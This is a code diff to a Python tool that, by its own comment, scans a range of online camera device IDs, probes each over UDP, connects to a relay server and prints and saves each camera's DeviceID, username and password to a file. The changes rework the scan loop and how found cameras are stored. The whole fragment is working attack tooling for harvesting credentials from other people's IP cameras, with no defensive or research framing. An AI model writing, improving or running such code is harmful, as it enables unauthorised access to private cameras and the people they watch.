@@ -9,7 +9,7 @@ import os
 
 class server:
     # CHECKER CONFIG FOR SCANNING CAMS ONLINE IN RANGE
-    SCAN_NEW_CAMS = True
+    SCAN_NEW_CAMS = False
     FROM_ID = 10745000
     TO_ID = 10746000
     PACK_LIST = 100000  # SIZE LIST ID CAMS FOR 1 THREAD
@@ -29,9 +29,9 @@ class server:
         try:
             if self.SCAN_NEW_CAMS:
                 self.GenerateListCams(f=self.FROM_ID, to=self.TO_ID)
-            self.RemoveDuplicate()
-            self.CamList(self.FileListCams)
             while True:
+                self.RemoveDuplicate()
+                self.CamList(self.FileListCams)
                 if not bool(self.CamsList):
                     break
                 all_processes = []
@@ -42,7 +42,6 @@ class server:
                         self.process.start()
                 for p in all_processes:
                     p.join()
-
         except socket.error as e:
             print("socket creation failed with error %s" % (e))
 
@@ -115,9 +114,10 @@ class server:
                 print(f'\u001b[32m[+] DeviceID: {d["id"]}')
                 print(f'[+] Username: {username}')
                 print(f'[+] Password: {password}\u001b[37m')
+                self.CamsList.remove(d["id"])
+                self.SaveCams(self.CamsList)
                 with open(self.PassFile, "a") as f:
                     f.write(f"{d['id']}:{str(username)}:{str(password)}\n")
-                self.CamsList.remove(d['id'])
                 relay_s.close()
                 return d["id"]
         except socket.error as e:
@@ -149,12 +149,6 @@ class server:
 
     def CreateSocket(self, dev):
         try:
-            with open(self.PassFile, 'r') as f:
-                for index, line in enumerate(f):
-                    # search string
-                    if dev in line:
-                        self.CamsList.remove(dev)
-                        break
             check_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             if self.DEBUG:
                 print("\u001b[31mPID: %s\u001b[37m" % self.process.pid)
@@ -169,25 +163,16 @@ class server:
             print(f'\u001b[32m[+]Sniffing {dev}...\u001b[37m')
             time.sleep(0.001)
             result = (check_s.recvfrom(4096, 0))[0]
-            if result[6:7] == b'\x00':
-                self.CamsList.remove(dev)
-            else:
+            if result[6:7] != b'\x00':
                 result = self.ParseRelayServer(result)
-                id_cam = self.ConnectToRelay(result)
-                self.CamsList.remove(id_cam)
+                self.ConnectToRelay(result)
                 check_s.close()
         except timeout:
             print('caught a timeout')
 
-    def DeleteStrForFile(self, idDelete):
-        delete_list = [idDelete]
-        with open(self.FileListCams) as fin, open(self.TMP_FILE, "w+") as fout:
-            for line in fin:
-                for word in delete_list:
-                    line = line.replace(word, "")
-                fout.write(line)
-            os.replace(self.TMP_FILE, self.FileListCams)
-            self.RemoveDuplicate()
+    def SaveCams(self, list_id):
+        with open(self.FileListCams, 'w') as fp:
+            fp.write('\n'.join(list_id))
 
     @staticmethod
     def byte2str(s):
